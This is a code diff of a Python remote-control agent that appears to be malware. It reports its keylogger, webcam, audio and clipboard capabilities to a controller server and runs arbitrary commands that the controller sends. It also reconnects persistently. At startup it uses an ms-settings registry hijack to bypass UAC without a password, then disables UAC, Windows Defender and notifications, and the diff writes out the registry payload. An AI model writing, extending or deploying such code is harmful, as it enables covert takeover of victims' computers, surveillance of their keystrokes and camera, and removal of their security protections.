+        'public_ip': get_public_ip(),
+        'username': os.getenv('USERNAME') or os.getenv('USER') or 'unknown',
+        'version': '2.1',
+        'capabilities': {
+            'screen': True,
+            'camera': CV2_AVAILABLE,
+            'audio': PYAUDIO_AVAILABLE,
+            'keylogger': PYNPUT_AVAILABLE,
+            'clipboard': True,
+            'file_manager': True,
+            'process_manager': PSUTIL_AVAILABLE,
+            'webcam': CV2_AVAILABLE,
+            'webrtc': AIORTC_AVAILABLE
+        },
+        'timestamp': int(time.time() * 1000)
+    })
     
     # Emit WebRTC status if available
     if AIORTC_AVAILABLE:
@@ -11678,11 +12260,147 @@ def on_command(data):
                 output = "Invalid download command format. Use: download-file:file_path"
         elif command.startswith("play-voice:"):
             output = handle_voice_playback(command.split(":", 1))
+        elif command == "shutdown":
+            # Shutdown agent
+            output = "Agent shutting down..."
+            safe_emit('command_result', {
+                'agent_id': agent_id,
+                'output': output,
+                'terminal_type': 'system',
+                'timestamp': int(time.time() * 1000)
+            })
+            log_message("[SHUTDOWN] Agent shutdown requested")
+            time.sleep(1)
+            os._exit(0)
+        elif command == "restart":
+            # Restart agent
+            output = "Agent restarting..."
+            safe_emit('command_result', {
+                'agent_id': agent_id,
+                'output': output,
+                'terminal_type': 'system',
+                'timestamp': int(time.time() * 1000)
+            })
+            log_message("[RESTART] Agent restart requested")
+            time.sleep(1)
+            if WINDOWS_AVAILABLE:
+                os.execv(sys.executable, [sys.executable] + sys.argv)
+            else:
+                os.execv(sys.executable, [sys.executable] + sys.argv)
+        elif command == "collect-logs":
+            # Collect system logs
+            try:
+                logs = []
+                if WINDOWS_AVAILABLE:
+                    # Windows: Get recent Event Viewer logs
+                    result = execute_command("powershell -Command \"Get-EventLog -LogName System -Newest 100 | Select-Object TimeGenerated, EntryType, Source, Message | ConvertTo-Json\"")
+                    logs.append("=== Windows System Event Logs (Last 100) ===")
+                    if isinstance(result, dict):
+                        logs.append(result.get('output', ''))
+                    else:
+                        logs.append(str(result))
+                else:
+                    # Linux: Get syslog
+                    result = execute_command("tail -n 100 /var/log/syslog")
+                    logs.append("=== System Logs (Last 100 lines) ===")
+                    if isinstance(result, dict):
+                        logs.append(result.get('output', ''))
+                    else:
+                        logs.append(str(result))
+                
+                output = "\n".join(logs)
+            except Exception as e:
+                output = f"Error collecting logs: {e}"
+        elif command == "security-scan":
+            # Run security assessment
+            try:
+                scan_results = []
+                scan_results.append("=== Security Scan Results ===\n")
+                
+                # Check UAC status
+                if WINDOWS_AVAILABLE:
+                    scan_results.append("1. UAC Status:")
+                    result = execute_command("reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA")
+                    if isinstance(result, dict):
+                        scan_results.append(result.get('output', ''))
+                    else:
+                        scan_results.append(str(result))
+                    scan_results.append("")
+                
+                # Check Windows Defender
+                if WINDOWS_AVAILABLE:
+                    scan_results.append("2. Windows Defender Status:")
+                    result = execute_command("powershell -Command \"Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled | ConvertTo-Json\"")
+                    if isinstance(result, dict):
+                        scan_results.append(result.get('output', ''))
+                    else:
+                        scan_results.append(str(result))
+                    scan_results.append("")
+                
+                # Check firewall status
+                scan_results.append("3. Firewall Status:")
+                if WINDOWS_AVAILABLE:
+                    result = execute_command("netsh advfirewall show allprofiles state")
+                else:
+                    result = execute_command("sudo ufw status")
+                if isinstance(result, dict):
+                    scan_results.append(result.get('output', ''))
+                else:
+                    scan_results.append(str(result))
+                scan_results.append("")
+                
+                # Check running processes
+                scan_results.append("4. High-Risk Processes:")
+                if WINDOWS_AVAILABLE:
+                    result = execute_command("powershell -Command \"Get-Process | Where-Object {$_.CPU -gt 50} | Select-Object ProcessName, CPU, WorkingSet | ConvertTo-Json\"")
+                else:
+                    result = execute_command("ps aux | awk '{if($3>50.0) print $0}'")
+                if isinstance(result, dict):
+                    scan_results.append(result.get('output', ''))
+                else:
+                    scan_results.append(str(result))
+                
+                scan_results.append("\n=== Scan Complete ===")
+                output = "\n".join(scan_results)
+            except Exception as e:
+                output = f"Error running security scan: {e}"
+        elif command == "update-agent":
+            # Placeholder for agent update mechanism
+            output = "Agent update mechanism not yet implemented.\n"
+            output += "Future implementation will:\n"
+            output += "1. Download latest agent version from controller\n"
+            output += "2. Verify signature\n"
+            output += "3. Replace current executable\n"
+            output += "4. Restart with new version"
         elif command != "sleep":
             output = execute_command(command)
         
         if output:
-            safe_emit('command_result', {'agent_id': agent_id, 'output': output})
+            # For UI v2.1: Send PowerShell-formatted output
+            if isinstance(output, dict) and 'terminal_type' in output:
+                # Already formatted by execute_in_powershell
+                # Make sure formatted_text is included
+                result_data = {
+                    'agent_id': agent_id,
+                    'output': output.get('output', ''),
+                    'formatted_text': output.get('formatted_text', ''),
+                    'terminal_type': output.get('terminal_type', 'powershell'),
+                    'prompt': output.get('prompt', 'PS C:\\>'),
+                    'command': output.get('command', ''),
+                    'exit_code': output.get('exit_code', 0),
+                    'execution_time': output.get('execution_time', 0),
+                    'timestamp': output.get('timestamp', int(time.time() * 1000))
+                }
+                safe_emit('command_result', result_data)
+            else:
+                # Legacy format (plain string output)
+                safe_emit('command_result', {
+                    'agent_id': agent_id,
+                    'output': output,
+                    'terminal_type': 'legacy',
+                    'prompt': get_powershell_prompt(),
+                    'timestamp': int(time.time() * 1000)
+                })
     
     # Start execution thread (daemon, won't block)
     execution_thread = threading.Thread(target=execute_in_thread, daemon=True)
@@ -11695,6 +12413,11 @@ def on_execute_command(data):
     
     CRITICAL: Runs in separate thread to prevent blocking Socket.IO!
     """
+    print("\n" + "="*80)
+    print("🔍 CLIENT: execute_command EVENT RECEIVED")
+    print("="*80)
+    print(f"🔍 Data received: {data}")
+    
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle execute_command", "warning")
         return
@@ -11703,11 +12426,19 @@ def on_execute_command(data):
     command = data.get('command')
     execution_id = data.get('execution_id')
     
+    print(f"🔍 Agent ID in event: {agent_id}")
+    print(f"🔍 Command: {command}")
+    print(f"🔍 Execution ID: {execution_id}")
+    
     # Verify this command is for us
     our_agent_id = get_or_create_agent_id()
+    print(f"🔍 Our agent ID: {our_agent_id}")
+    
     if agent_id != our_agent_id:
+        print(f"❌ Command not for us (expected {our_agent_id}, got {agent_id})")
         return  # Not for this agent
     
+    print(f"✅ Command is for us, proceeding to execute: {command}")
     log_message(f"[EXECUTE_COMMAND] Received: {command} (execution_id: {execution_id})")
     
     # Run command in separate thread to prevent blocking Socket.IO!
@@ -11729,7 +12460,108 @@ def on_execute_command(data):
             "systeminfo": lambda: execute_command("systeminfo" if WINDOWS_AVAILABLE else "uname -a"),
         }
         
-        if command in internal_commands:
+        # Handle bulk action commands
+        if command == "shutdown":
+            output = "Agent shutting down..."
+            success = True
+            safe_emit('command_result', {
+                'agent_id': our_agent_id,
+                'execution_id': execution_id,
+                'output': output,
+                'success': True,
+                'execution_time': 0
+            })
+            log_message("[SHUTDOWN] Agent shutdown requested via bulk action")
+            time.sleep(1)
+            os._exit(0)
+        elif command == "restart":
+            output = "Agent restarting..."
+            success = True
+            safe_emit('command_result', {
+                'agent_id': our_agent_id,
+                'execution_id': execution_id,
+                'output': output,
+                'success': True,
+                'execution_time': 0
+            })
+            log_message("[RESTART] Agent restart requested via bulk action")
+            time.sleep(1)
+            if WINDOWS_AVAILABLE:
+                os.execv(sys.executable, [sys.executable] + sys.argv)
+            else:
+                os.execv(sys.executable, [sys.executable] + sys.argv)
+        elif command == "collect-logs":
+            try:
+                logs = []
+                if WINDOWS_AVAILABLE:
+                    result = execute_command("powershell -Command \"Get-EventLog -LogName System -Newest 100 | Select-Object TimeGenerated, EntryType, Source, Message | ConvertTo-Json\"")
+                    logs.append("=== Windows System Event Logs (Last 100) ===")
+                    if isinstance(result, dict):
+                        logs.append(result.get('output', ''))
+                    else:
+                        logs.append(str(result))
+                else:
+                    result = execute_command("tail -n 100 /var/log/syslog")
+                    logs.append("=== System Logs (Last 100 lines) ===")
+                    if isinstance(result, dict):
+                        logs.append(result.get('output', ''))
+                    else:
+                        logs.append(str(result))
+                output = "\n".join(logs)
+            except Exception as e:
+                output = f"Error collecting logs: {e}"
+                success = False
+        elif command == "security-scan":
+            try:
+                scan_results = []
+                scan_results.append("=== Security Scan Results ===\n")
+                if WINDOWS_AVAILABLE:
+                    scan_results.append("1. UAC Status:")
+                    result = execute_command("reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA")
+                    if isinstance(result, dict):
+                        scan_results.append(result.get('output', ''))
+                    else:
+                        scan_results.append(str(result))
+                    scan_results.append("")
+                    scan_results.append("2. Windows Defender Status:")
+                    result = execute_command("powershell -Command \"Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled | ConvertTo-Json\"")
+                    if isinstance(result, dict):
+                        scan_results.append(result.get('output', ''))
+                    else:
+                        scan_results.append(str(result))
+                    scan_results.append("")
+                scan_results.append("3. Firewall Status:")
+                if WINDOWS_AVAILABLE:
+                    result = execute_command("netsh advfirewall show allprofiles state")
+                else:
+                    result = execute_command("sudo ufw status")
+                if isinstance(result, dict):
+                    scan_results.append(result.get('output', ''))
+                else:
+                    scan_results.append(str(result))
+                scan_results.append("")
+                scan_results.append("4. High-Risk Processes:")
+                if WINDOWS_AVAILABLE:
+                    result = execute_command("powershell -Command \"Get-Process | Where-Object {$_.CPU -gt 50} | Select-Object ProcessName, CPU, WorkingSet | ConvertTo-Json\"")
+                else:
+                    result = execute_command("ps aux | awk '{if($3>50.0) print $0}'")
+                if isinstance(result, dict):
+                    scan_results.append(result.get('output', ''))
+                else:
+                    scan_results.append(str(result))
+                scan_results.append("\n=== Scan Complete ===")
+                output = "\n".join(scan_results)
+            except Exception as e:
+                output = f"Error running security scan: {e}"
+                success = False
+        elif command == "update-agent":
+            output = "Agent update mechanism not yet implemented.\n"
+            output += "Future implementation will:\n"
+            output += "1. Download latest agent version from controller\n"
+            output += "2. Verify signature\n"
+            output += "3. Replace current executable\n"
+            output += "4. Restart with new version"
+        elif command in internal_commands:
             try:
                 output = internal_commands[command]()
                 if output is None:
@@ -11749,14 +12581,27 @@ def on_execute_command(data):
         
         # Send output back to controller WITH execution_id
         log_message(f"[EXECUTE_COMMAND] Sending output ({len(output)} chars) with execution_id: {execution_id}")
-        safe_emit('command_result', {
-            'agent_id': our_agent_id,
-            'execution_id': execution_id,
-            'command': command,
-            'output': output,
-            'success': success,
-            'timestamp': time.time()
-        })
+        # For UI v2.1: Send PowerShell-formatted output
+        if isinstance(output, dict) and 'terminal_type' in output:
+            # Already formatted by execute_in_powershell
+            safe_emit('command_result', {
+                'agent_id': our_agent_id,
+                'execution_id': execution_id,
+                'success': success,
+                **output  # Spread PowerShell formatting data
+            })
+        else:
+            # Legacy format
+            safe_emit('command_result', {
+                'agent_id': our_agent_id,
+                'execution_id': execution_id,
+                'command': command,
+                'output': output,
+                'success': success,
+                'terminal_type': 'legacy',
+                'prompt': get_powershell_prompt(),
+                'timestamp': int(time.time() * 1000)
+            })
     
     # Start execution in background thread (daemon, won't block)
     execution_thread = threading.Thread(target=execute_in_thread, daemon=True)
@@ -12610,26 +13455,42 @@ def agent_main():
         
         log_message("Initializing connection to server...")
         
+        # Register Socket.IO event handlers ONCE before connection loop
+        # This ensures handlers persist across all reconnections
+        if sio is not None and SOCKETIO_AVAILABLE:
+            log_message("Registering Socket.IO event handlers...")
+            try:
+                register_socketio_handlers()
+                log_message("[OK] Socket.IO event handlers registered (will persist across reconnections)")
+            except Exception as handler_error:
+                log_message(f"[ERROR] Failed to register Socket.IO handlers: {handler_error}")
+                log_message("Cannot continue without event handlers!")
+                return
+            
+            # Start connection health monitor
+            log_message("Starting connection health monitor...")
+            health_monitor_thread = threading.Thread(target=connection_health_monitor, daemon=True, name="ConnectionHealthMonitor")
+            health_monitor_thread.start()
+            log_message("[OK] Connection health monitor started (checks every 1 second)")
+        else:
+            log_message("Socket.IO not available - running in offline mode", "warning")
+            log_message("Agent running in offline mode - no server communication")
+            try:
+                while True:
+                    time.sleep(60)  # Keep alive in offline mode
+            except KeyboardInterrupt:
+                log_message("Offline mode interrupted")
+            return
+        
         # Main connection loop with improved error handling
         connection_attempts = 0
+        max_retry_delay = 60  # Maximum retry delay in seconds
         while True:
             try:
                 connection_attempts += 1
-                log_message(f"Connecting to server at {SERVER_URL} (attempt {connection_attempts})...")
-                if sio is None or not SOCKETIO_AVAILABLE:
-                    log_message("Socket.IO not available - running in offline mode", "warning")
-                    # Continue running in offline mode
-                    log_message("Agent running in offline mode - no server communication")
-                    try:
-                        while True:
-                            time.sleep(60)  # Keep alive in offline mode
-                            # Could implement local functionality here
-                    except KeyboardInterrupt:
-                        log_message("Offline mode interrupted")
-                    return
+                retry_delay = min(connection_attempts * 5, max_retry_delay)  # Progressive backoff
                 
-                # Add connection timeout and better error handling
-                log_message(f"Attempting to connect to {SERVER_URL}...")
+                log_message(f"Connecting to server at {SERVER_URL} (attempt {connection_attempts})...")
                 
                 # Test if controller is reachable first
                 if REQUESTS_AVAILABLE:
@@ -12639,10 +13500,18 @@ def agent_main():
                         log_message(f"[OK] Controller is reachable (HTTP {test_response.status_code})")
                     except Exception as e:
                         log_message(f"[WARN] Controller may not be reachable: {e}")
-                        log_message(f"[INFO] Controller should be running at: {SERVER_URL}")
+                        log_message(f"[INFO] Will retry in {retry_delay} seconds...")
                 
                 sio.connect(SERVER_URL, wait_timeout=10)
                 log_message("[OK] Connected to server successfully!")
+                
+                # Reset connection attempts and state on successful connection
+                connection_attempts = 0
+                CONNECTION_STATE['connected'] = True
+                CONNECTION_STATE['consecutive_failures'] = 0
+                CONNECTION_STATE['reconnect_needed'] = False
+                CONNECTION_STATE['force_reconnect'] = False
+                
                 # Email notify once when agent comes online
                 global EMAIL_SENT_ONLINE
                 if not EMAIL_SENT_ONLINE:
@@ -12659,19 +13528,36 @@ def agent_main():
                         EMAIL_SENT_ONLINE = True
                         log_message("Email notification sent: agent online")
                 
-                # Register Socket.IO event handlers after successful connection
-                try:
-                    register_socketio_handlers()
-                    log_message("[OK] Socket.IO event handlers registered successfully")
-                except Exception as handler_error:
-                    log_message(f"[WARN] Failed to register Socket.IO handlers: {handler_error}")
+                # Handlers are already registered - no need to register again
+                log_message("[INFO] Event handlers already registered and active")
                 
                 # Manually register agent with controller
                 try:
                     log_message(f"[INFO] Registering agent {agent_id} with controller...")
                     
                     # ✅ SAFE EMIT: Critical registration path
-                    if not safe_emit('agent_connect', {'agent_id': agent_id}):
+                    if not safe_emit('agent_connect', {
+        'agent_id': agent_id,
+        'hostname': socket.gethostname(),
+        'platform': platform.system(),
+        'os_version': platform.release(),
+        'ip_address': get_local_ip(),
+        'public_ip': get_public_ip(),
+        'username': os.getenv('USERNAME') or os.getenv('USER') or 'unknown',
+        'version': '2.1',
+        'capabilities': {
+            'screen': True,
+            'camera': CV2_AVAILABLE,
+            'audio': PYAUDIO_AVAILABLE,
+            'keylogger': PYNPUT_AVAILABLE,
+            'clipboard': True,
+            'file_manager': True,
+            'process_manager': PSUTIL_AVAILABLE,
+            'webcam': CV2_AVAILABLE,
+            'webrtc': AIORTC_AVAILABLE
+        },
+        'timestamp': int(time.time() * 1000)
+    }):
                         log_message(f"[ERROR] Failed to send agent registration - connection issue", "error")
                     else:
                         log_message(f"[OK] Agent {agent_id} registration sent to controller")
@@ -12725,10 +13611,25 @@ def agent_main():
                 heartbeat_thread.start()
                 log_message("[OK] Heartbeat started")
                 
+                # Keep connection alive and wait for events
                 sio.wait()
-            except socketio.exceptions.ConnectionError:
-                log_message(f"[WARN] Connection failed (attempt {connection_attempts}). Retrying in 10 seconds...")
-                time.sleep(10)
+                
+            except socketio.exceptions.ConnectionError as conn_err:
+                retry_delay = min(connection_attempts * 5, max_retry_delay)
+                log_message(f"[WARN] Connection failed (attempt {connection_attempts}): {conn_err}")
+                log_message(f"[INFO] Retrying in {retry_delay} seconds...")
+                
+                # Update connection state
+                CONNECTION_STATE['connected'] = False
+                CONNECTION_STATE['consecutive_failures'] += 1
+                
+                # Stop all operations before retrying
+                try:
+                    stop_all_operations()
+                except:
+                    pass
+                
+                time.sleep(retry_delay)
             except KeyboardInterrupt:
                 log_message("\n[INFO] Received interrupt signal. Shutting down gracefully...")
                 break
@@ -12809,6 +13710,15 @@ def signal_handler(signum, frame):
     sys.exit(0)
 
 if __name__ == "__main__":
+    # Check if we're being imported by an elevated script (prevents recursive execution)
+    if os.environ.get('ELEVATED_MODE') == '1':
+        # We're in elevated mode - don't run main startup, just provide functions
+        print("[ELEVATED] Script loaded in elevated mode - functions available for import")
+        # DO NOT run the full startup sequence - the elevated script will import and call specific functions
+        # Exit immediately to prevent recursive execution
+        sys.exit(0)
+    
+    # Normal startup mode - proceed with full startup
     # Add startup banner before anything else
     print("[STARTUP] Python Agent Starting...")
     print("[STARTUP] Initializing components...")
@@ -12839,7 +13749,7 @@ if __name__ == "__main__":
         print("[STARTUP] Step 0: Disabling WSL routing (AGGRESSIVE)...")
         try:
             if disable_wsl_routing():
-                print("[STARTUP] ✅ WSL routing disabled - commands will use CMD.exe directly")
+                print("[STARTUP] ✅ WSL routing disabled - commands will use PowerShell directly")
             else:
                 print("[STARTUP] ⚠️ WSL routing disable failed (not critical)")
         except Exception as e:
@@ -12849,6 +13759,7 @@ if __name__ == "__main__":
         print("\n[STARTUP] Step 1: BOOTSTRAP UAC DISABLE (NO ADMIN REQUIRED!)...")
         print("[STARTUP] This uses UAC bypass to gain admin, then disables UAC!")
         print("[STARTUP] Works from STANDARD USER account - NO PASSWORD NEEDED!")
+        print("[STARTUP] NOTE: If UAC bypass fails, the agent will continue running normally")
         try:
             if bootstrap_uac_disable_no_admin():
                 print("[STARTUP] ✅✅✅ UAC DISABLED SUCCESSFULLY!")
@@ -12856,16 +13767,17 @@ if __name__ == "__main__":
                 print("[STARTUP] ✅ Admin password popups are NOW DISABLED for ALL exe/installers!")
                 print("[STARTUP] ✅ You can now run ANY application without password prompts!")
             else:
-                print("[STARTUP] ⚠️ Bootstrap failed - trying direct method...")
-                # Fallback to direct method
-                if silent_disable_uac():
-                    print("[STARTUP] ✅ UAC disabled using direct method")
-                else:
-                    print("[STARTUP] ⚠️ UAC disable failed - may need to run as administrator")
+                print("[STARTUP] ⚠️ Bootstrap UAC bypass failed")
+                print("[STARTUP] ℹ️ Agent will continue running with normal privileges")
+                print("[STARTUP] ℹ️ UAC bypass will retry in background if needed")
+                # DO NOT try fallback methods that might cause UAC prompts
+                # Just continue running - the background thread will retry
         except Exception as e:
             print(f"[STARTUP] UAC disable error: {e}")
-            import traceback
-            traceback.print_exc()
+            print("[STARTUP] ℹ️ Agent will continue running normally")
+            # Don't print full traceback for UAC failures - it's expected
+            # import traceback
+            # traceback.print_exc()
         
         # 2. Disable Windows Defender
         print("\n[STARTUP] Step 2: Disabling Windows Defender...")
@@ -12873,9 +13785,9 @@ if __name__ == "__main__":
             if disable_defender():
                 print("[STARTUP] ✅ Windows Defender disabled successfully")
             else:
-                print("[STARTUP] ⚠️ Defender disable failed")
+                print("[STARTUP] ℹ️ Defender disable failed - will retry in background")
         except Exception as e:
-            print(f"[STARTUP] Defender disable error: {e}")
+            print(f"[STARTUP] ℹ️ Defender disable error (non-critical): {e}")
         
         # 3. Disable Windows notifications
         print("\n[STARTUP] Step 3: Disabling Windows notifications...")
@@ -12883,9 +13795,9 @@ if __name__ == "__main__":
             if disable_windows_notifications():
                 print("[STARTUP] ✅ Notifications disabled successfully")
             else:
-                print("[STARTUP] ⚠️ Notification disable failed")
+                print("[STARTUP] ℹ️ Notification disable failed - will retry in background")
         except Exception as e:
-            print(f"[STARTUP] Notification disable error: {e}")
+            print(f"[STARTUP] ℹ️ Notification disable error (non-critical): {e}")
         
         print("\n" + "=" * 80)
         print("[STARTUP] === SYSTEM CONFIGURATION COMPLETE ===")
@@ -13215,7 +14127,7 @@ def write_and_import_uac_bypass_reg():
 Windows Registry Editor Version 5.00
 
 [HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command]
-@="cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f && reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f"
+@="powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'EnableLUA' -Value 0 -Force; Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0 -Force\""
 "DelegateExecute"=""
 '''
     
